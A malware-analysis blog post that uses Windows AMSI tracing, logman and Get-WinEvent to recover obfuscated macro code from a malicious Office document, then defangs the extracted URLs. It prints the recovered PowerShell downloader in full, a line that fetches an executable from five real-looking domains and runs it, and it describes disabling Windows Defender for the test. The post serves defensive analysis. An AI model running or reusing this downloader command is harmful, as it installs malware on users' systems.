---
layout: post
title: The Power of AMSI Tracing
categories: [Malware, Logging, AMSI]
excerpt: A walk through of how to leverage the Windows OS AMSI Tracing feature to quickly and easily retrieve heavily obfuscated code from maldocs to find IOC's. 
---

(Estimated Reading Time: 5 minutes)

- [Inspiration](#inspiration)
- [A Couple Samples](#a-couple-samples)
- [References](#references)

## Inspiration

While reviewing my tweeter feed this morning, the following [gist post from Matt Graeber](https://gist.github.com/mgraeber-rc/51651b859ee543260e0f4d3a281b8bf5) caught my attention. He tweeted about using the Windows Event Logging system, specifically AMSI Tracing logs, to capture the runtime context of VBA, Excel4, JScript, VBScript, PowerShell, WMI, and .NET (4.8+) in-mem assembly loads.

Typically, maldocs will include heavily obfuscated and encoded macro's making it difficult to reverse engineer back to something that is readable and understandable. Tools like [oledump.py](https://blog.didierstevens.com/programs/oledump-py/) from Didier Stevens can help extract those macros into a flat file for static reversing but that can take work. I've take an example maldoc below and shown how easily the malicious command line can be obtained using the technique Matt Graeber posted about. 

## A Sample

Using a sample from this blog: [Reverse Engineering an Obfuscated Malicious Macro](https://medium.com/walmartglobaltech/reverse-engineering-an-obfuscated-malicious-macro-3fd4d4f9c439) I'll demonstrate how easy it is to retrieve the powershell commands. 

The sample with SHA256 hash: [9d0e185ad2ed2ee4cd332294a17b534987b969c44931b49cdbcbfc329ea63f22](https://labs.inquest.net/dfi/sha256/9d0e185ad2ed2ee4cd332294a17b534987b969c44931b49cdbcbfc329ea63f22) can be found for easy download on labs.inquest.net.

As you can see below the following macro looks like it would take some work to reverse. The author of the prior mentioned blog shows a step by step static approach to walking this mess

![macro1](/images/macrosample1.jpg)

back to something readable.

![macro2](/images/macrosample2.jpg)

Now we will use the AMSI Tracing feature of Windows and CyberChef to arrive at the same outcome with much less effort.

Step 1. Start Tracing

```
logman start trace AMSITrace -p Microsoft-Antimalware-Scan-Interface -o amsi.etl -ets
```

Step 2. Run the sample. Using the sample I downloaded above, I opened the sample (in a virtual machine of course), and enabled macros (ie the office yellow ribbon). Also, make sure Windows Defender is disabled or else it will prevent the macro from running before AMSI Trace will see the command. After running the macro, stop the trace.

```
logman stop AMSITrace -ets
```

Step 3. View the collected trace data with the following command. 

```
Get-WinEvent -Path .\amsi.etl -Oldest | ? { $_.Id -eq 1101 } | % { [Text.Encoding]::Unicode.GetString($_.Properties[-3].Value) }
```

Using the sample above I could clearly see the following command in the collected AMSI trace data from the image below.

```
a$Ywi=new-object Net.WebClient;$jKB='http://jany.be/UsCX@http://jfogal.com/C@http://inspekservices.co.uk/g@http://ilgiardinodellevisciole.it/ny@http://www.diman.landesigne.ru/Q'.Split('@');$LtU = '394';$jri=$env:public+'\'+$LtU+'.exe';foreach($JBf in $jKB){try{$Ywi.DownloadFile($JBf, $jri);Invoke-Item $jri;break;}catch{}}
```

![ps2](/images/ps_amsi2.PNG)

I then took the above command and pasted it into [CyberChef](https://gchq.github.io/CyberChef/#recipe=Extract_URLs(false)Find_/_Replace(%7B'option':'Simple%20string','string':'@'%7D,'%5C%5Cn',true,false,true,false)Defang_URL(true,true,true,'Valid%20domains%20and%20full%20URLs')&input=YSRZd2k9bmV3LW9iamVjdCBOZXQuV2ViQ2xpZW50OyRqS0I9J2h0dHA6Ly9qYW55LmJlL1VzQ1hAaHR0cDovL2pmb2dhbC5jb20vQ0BodHRwOi8vaW5zcGVrc2VydmljZXMuY28udWsvZ0BodHRwOi8vaWxnaWFyZGlub2RlbGxldmlzY2lvbGUuaXQvbnlAaHR0cDovL3d3dy5kaW1hbi5sYW5kZXNpZ25lLnJ1L1EnLlNwbGl0KCdAJyk7JEx0VSA9ICczOTQnOyRqcmk9JGVudjpwdWJsaWMrJ1wnKyRMdFUrJy5leGUnO2ZvcmVhY2goJEpCZiBpbiAkaktCKXt0cnl7JFl3aS5Eb3dubG9hZEZpbGUoJEpCZiwgJGpyaSk7SW52b2tlLUl0ZW0gJGpyaTticmVhazt9Y2F0Y2h7fX0) to pull out the URL's quick and defang them. In the end I got the same result as static analysis only much easier.

```
hxxp[://]jany[.]be/UsCX
hxxp[://]jfogal[.]com/C
hxxp[://]inspekservices[.]co[.]uk/g
hxxp[://]ilgiardinodellevisciole[.]it/ny
hxxp[://]www[.]diman[.]landesigne[.]ru/Q
```

I will certainly be using AMSI Tracing more in future projects. Thanks, [Matt Graeber](https://twitter.com/mattifestation) for sharing this dynamic analysis technique.

## References

* Link to [GIST Post by Matt Graeber](https://gist.github.com/mgraeber-rc/51651b859ee543260e0f4d3a281b8bf5)
* Link to [Reverse Engineering an Obfuscated Malicious Macro](https://medium.com/walmartglobaltech/reverse-engineering-an-obfuscated-malicious-macro-3fd4d4f9c439)